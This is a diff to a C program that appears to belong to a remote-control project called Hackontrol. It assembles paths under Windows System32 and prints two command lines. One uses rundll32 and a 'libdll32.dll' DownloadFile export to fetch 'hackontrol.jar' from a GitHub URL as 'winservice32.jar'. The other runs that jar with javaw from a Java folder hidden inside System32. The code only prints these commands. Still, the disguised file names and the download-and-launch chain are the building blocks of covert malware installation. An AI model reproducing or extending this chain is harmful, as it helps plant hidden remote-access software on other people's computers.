@@ -1,7 +1,6 @@
-#define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
-#include <khopanarray.h>
 #include <khopanwin32.h>
+#include <khopanstring.h>
 /*#include <khopanwin32.h>
 #include <mmdeviceapi.h>
 #include <audioclient.h>
@@ -12,11 +11,72 @@ EXTERN_GUID(IID_IAudioClient,         0x1CB9AD4C, 0xDBFA, 0x4c32, 0xB1, 0x78, 0x
 EXTERN_GUID(IID_IAudioCaptureClient,  0xC8ADBD64, 0xE71E, 0x48a0, 0xA4, 0xDE, 0x18, 0x5C, 0x39, 0x5C, 0xD3, 0x17);
 EXTERN_GUID(IID_IAudioRenderClient,   0xF294ACFC, 0x3146, 0x4483, 0xA7, 0xBF, 0xAD, 0xDC, 0xA7, 0xC2, 0x60, 0xE2);*/
 
+#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
+
+#define FILE_JAVAW        L"javaw.exe"
+#define FILE_LIBDLL32     L"libdll32.dll"
+#define FILE_RUNDLL32     L"rundll32.exe"
+#define FILE_HACKONTROL   L"hackontrol.jar"
+#define FILE_WINSERVICE32 L"winservice32.jar"
+#define FOLDER_SYSTEM32   L"System32"
+#define FOLDER_JAVA       L"jn"
+#define FUNCTION_LIBDLL32 L"DownloadFile"
+#define URL_HACKONTROL    L"https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/"
+
 int main(int argc, char** argv) {
-	FILE* file;
+	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();
+
+	if(!pathFolderWindows) {
+		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
+		return;
+	}
+
+	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
+	FREE(pathFolderWindows);
+
+	if(!pathFolderSystem32) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		return;
+	}
+
+	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FILE_RUNDLL32, pathFolderSystem32);
+
+	if(!pathFileRundll32) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		return;
+	}
+
+	printf("System32: %ws\nRundll32: %ws\nArgument: %ws\n", pathFolderSystem32, pathFileRundll32, FILE_RUNDLL32 L" " FILE_LIBDLL32 L"," FUNCTION_LIBDLL32 L" " URL_HACKONTROL FILE_HACKONTROL L"," FILE_WINSERVICE32);
+
+	LPSTR pathFolderJava = KHFormatMessageA("%ws\\%ws", pathFolderSystem32, FOLDER_JAVA);
+
+	if(!pathFolderJava) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		return;
+	}
+
+	printf("\nJava: %s\n", pathFolderJava);
+
+	LPWSTR pathFolderJavaBinary = KHFormatMessageW(L"%ws\\" FOLDER_JAVA L"\\bin", pathFolderSystem32);
+
+	if(!pathFolderJavaBinary) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		return;
+	}
+
+	LPWSTR pathFileJavaw = KHFormatMessageW(L"%ws\\" FILE_JAVAW, pathFolderJavaBinary);
+
+	if(!pathFileJavaw) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(pathFolderJavaBinary);
+		return;
+	}
+
+	printf("\nJavaw: %ws\nArgument: %ws\nBinary: %ws\n", pathFileJavaw, FILE_JAVAW L" -jar ..\\..\\" FILE_WINSERVICE32, pathFolderJavaBinary);
+	/*FILE* file;
 	errno_t error = fopen_s(&file, "imnotexistpleasedontletmeexist", "r");
 	char* value = strerror(error);
-	printf("Data: %s\n", value);
+	printf("Data: %s\n", value);*/
 	/*ArrayList list;
 	
 	if(!KHArrayInitialize(&list, sizeof(UINT32))) {
